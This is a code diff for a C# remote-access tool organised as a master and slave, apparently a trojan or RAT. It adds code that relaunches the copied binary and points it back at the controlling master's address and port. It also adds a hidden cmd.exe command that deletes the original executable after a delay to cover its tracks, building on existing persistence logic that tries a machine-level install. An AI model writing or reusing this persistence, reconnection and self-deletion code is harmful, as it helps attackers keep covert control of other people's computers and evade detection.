@@ -1,7 +1,9 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.Diagnostics;
 using System.IO;
 using System.Threading;
+using System.Windows.Forms;
 using Microsoft.Win32;
 using Shared;
 using Slave.Core;
@@ -14,7 +16,8 @@ namespace Slave.Commands
 
         public void Process(List<string> args)
         {
-            var path = args[0];
+            var path = Path.GetFullPath(args[0]);
+
             if (!CopyFileToDestination(path))
             {
                 // File couldn't be copied, abort
@@ -22,7 +25,7 @@ namespace Slave.Commands
                 return;
             }
             // File copied at <path>
-            GlobalCommandsManager.networkManager.WriteLine("OK");
+            GlobalCommandsManager.networkManager.WriteLine(path);
 
 
             // Try to install the persistance at machine level, it required admin privileges
@@ -46,12 +49,40 @@ namespace Slave.Commands
                     {
                         // Remove copied executable
                         File.Delete(path);
+                        return;
                     }
                     catch (Exception)
                     {
                         // Ignored
                     }
                 }
+            }
+
+            var slaveNetManager = (SlaveNetworkManager) GlobalCommandsManager.networkManager;
+            var masterInfos = slaveNetManager.GetMasterInfos();
+            var newProcess = new Process()
+            {
+                StartInfo = new ProcessStartInfo(path, $"{masterInfos.Item1} {masterInfos.Item2 + 1}")
+            };
+            newProcess.Start();
+
+            // Wait for confirmation from the master
+            if (GlobalCommandsManager.networkManager.ReadLine() == "connected")
+            {
+                var selfDestructProcess = new Process()
+                {
+                    StartInfo = new ProcessStartInfo()
+                    {
+                        FileName = "cmd.exe",
+                        Arguments = "/C choice /C Y /N /D Y /T 4 & Del " + Application.ExecutablePath,
+                        WindowStyle = ProcessWindowStyle.Hidden,
+                        CreateNoWindow = true
+                    }
+                };
+                selfDestructProcess.Start();
+
+                // Exit to allow deletion
+                throw new StopSlaveException();
             }
         }
 
